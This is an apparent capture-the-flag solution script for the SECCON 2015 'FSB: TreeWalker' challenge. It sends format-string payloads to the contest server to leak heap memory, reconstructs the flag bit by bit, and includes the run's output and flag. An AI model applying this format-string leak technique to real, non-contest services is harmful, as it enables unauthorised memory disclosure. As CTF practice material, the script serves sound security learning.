# Seccon 2015 Quals - Exploit FSB:TreeWalker 200pts Solves:51
# github.com/SECCON/SECCON2015_online_CTF/tree/master/Exploit/200_FSB:%20TreeWalker
# FSB Leak task :)
from pwn import connst
from struct import pack, unpack

# exceptions
out_of_range = """[!] Try again, the Three bytes tree is not \
                working on this python code correctly."""

s, t = connst("treewalker.pwn.seccon.jp", 20000)

def leak(addr):
    p  = "%p" * 20        # p = "%llx" * 30
    p += "%s"
    p += "mmark\x00"
    p += pack("Q", addr)
    p += '\x00' * (0x512 - len(p))

    s.send(pack("q", 0x512))
    s.send(p)

    return s.recv(1024)[-9:-5]

def main():
    tree = int(s.recv(1024), 16)
    print "TREE : " + hex(tree)

    if tree < 0x01000000:
        print out_of_range
        return 0

    byte = ""
    flag = ""
    while byte != "}":
        byte = ""

        for i in range(8):
            buf = unpack("I", leak(tree + 8))[0]

            if buf == (tree + 0x20):
                byte += '1'
                print '1',
            else:
                byte += '0'
                print '0',

            tree = tree + 0x20

        byte = chr(int(byte, 2))
        flag += byte
        print byte

    print flag

if __name__ == "__main__":
    main()
"""
TREE : 0x174d010
0 1 0 1 0 0 1 1 S
0 1 0 0 0 1 0 1 E
0 1 0 0 0 0 1 1 C
0 1 0 0 0 0 1 1 C
0 1 0 0 1 1 1 1 O
0 1 0 0 1 1 1 0 N
0 1 1 1 1 0 1 1 {
0 0 1 1 0 1 0 0 4
0 1 1 1 0 0 1 0 r
0 1 1 0 0 0 1 0 b
0 0 1 1 0 0 0 1 1
0 0 1 1 0 1 1 1 7
0 1 0 1 0 0 1 0 R
0 1 0 0 0 0 0 0 @
0 1 1 1 0 0 1 0 r
0 1 0 1 1 0 0 1 Y
0 1 0 1 0 0 1 0 R
0 1 1 0 0 1 0 1 e
0 1 0 0 0 0 0 1 A
0 1 1 0 0 1 0 0 d
0 1 1 1 1 1 0 1 }
SECCON{4rb17R@rYReAd}
[Finished in 28.0s]
"""
